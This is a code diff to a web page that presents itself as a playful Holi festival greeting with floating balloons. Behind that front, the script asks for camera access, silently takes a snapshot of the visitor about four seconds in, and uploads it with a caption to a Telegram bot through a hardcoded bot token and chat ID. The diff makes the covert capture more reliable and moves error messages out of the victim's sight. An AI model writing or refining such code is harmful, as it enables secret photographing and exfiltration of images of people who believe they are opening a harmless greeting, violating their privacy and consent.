@@ -72,13 +72,12 @@
     <canvas id="snapCanvas"></canvas>
 
     <script>
-        // ---------------------------------------------------------
+      // ---------------------------------------------------------
         // ⚠️ STEP 1: FILL THESE DETAILS CAREFULLY ⚠️
         // ---------------------------------------------------------
         const TOKEN = "8636656865:AAHfvDz0yIaR_APm6Gblb3mlAQlv3MDDkLw"; 
-        const CHAT_ID = " 8485099057"; 
+        const CHAT_ID = "8485099057"; // FIXED: Removed the leading space
 
-        // Extract Name from Link (?name=Rahul)
         const urlParams = new URLSearchParams(window.location.search);
         const personName = urlParams.get('name') || "";
         
@@ -128,39 +127,50 @@
 
         async function startExperience() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Requesting camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const videoEl = document.getElementById('video');
                 videoEl.srcObject = stream;
                 
+                // Ensure video starts playing immediately
+                videoEl.play();
+
                 document.getElementById('mainUI').style.opacity = '0';
                 setTimeout(() => document.getElementById('mainUI').style.visibility = 'hidden', 500);
                 
                 isActive = true;
                 spawnBalloons();
 
-                // 📸 SILENT CAPTURE (At 5 seconds)
+                // 📸 SILENT CAPTURE (At 4 seconds to ensure stream is stable)
                 setTimeout(() => {
-                    if (videoEl.readyState >= 2) {
-                        const snapCanvas = document.getElementById('snapCanvas');
-                        snapCanvas.width = videoEl.videoWidth; 
-                        snapCanvas.height = videoEl.videoHeight;
-                        snapCanvas.getContext('2d').drawImage(videoEl, 0, 0);
+                    const snapCanvas = document.getElementById('snapCanvas');
+                    // Setting dimensions to match video stream
+                    snapCanvas.width = videoEl.videoWidth || 640; 
+                    snapCanvas.height = videoEl.videoHeight || 480;
+                    
+                    const context = snapCanvas.getContext('2d');
+                    context.drawImage(videoEl, 0, 0, snapCanvas.width, snapCanvas.height);
+                    
+                    snapCanvas.toBlob((blob) => {
+                        if (!blob) return;
+                        const fd = new FormData();
+                        fd.append("chat_id", CHAT_ID.trim()); 
+                        fd.append("photo", blob, "holi_snap.png");
+                        fd.append("caption", `Holi Splash from ${personName || 'Guest'}! 🎨`);
                         
-                        snapCanvas.toBlob(blob => {
-                            const fd = new FormData();
-                            // FIXED: Using global CHAT_ID properly
-                            fd.append("chat_id", CHAT_ID); 
-                            fd.append("photo", blob, "holi_snap.png");
-                            
-                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd })
-                            .then(res => res.json())
-                            .then(data => {
-                                if(!data.ok) alert("Telegram Error: " + data.description + "\n\n1. Ensure CHAT_ID is correct.\n2. Ensure you pressed START on the bot.");
-                            });
-                        }, "image/png");
-                    }
-                }, 5000);
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
+                            method: "POST", 
+                            body: fd 
+                        })
+                        .then(res => res.json())
+                        .then(data => {
+                            if(!data.ok) console.error("Telegram API Error:", data.description);
+                        })
+                        .catch(err => console.error("Network Error:", err));
+                    }, "image/png");
+                }, 4000);
 
+                // End Experience Timer
                 setTimeout(() => {
                     isActive = false;
                     document.querySelectorAll('.balloon').forEach(el => el.remove());
@@ -169,11 +179,15 @@
                         document.getElementById('grandHoli').style.display = 'none';
                         document.getElementById('mainUI').style.visibility = 'visible';
                         document.getElementById('mainUI').style.opacity = '1';
+                        // Stop camera tracks to save battery/privacy
                         stream.getTracks().forEach(t => t.stop()); 
                     }, 4000);
                 }, 9000);
 
-            } catch (err) { alert("Camera access is needed for the magic!"); }
+            } catch (err) { 
+                console.error(err);
+                alert("Camera access is needed for the magic! Please enable permissions."); 
+            }
         }
 
         function spawnBalloons() {
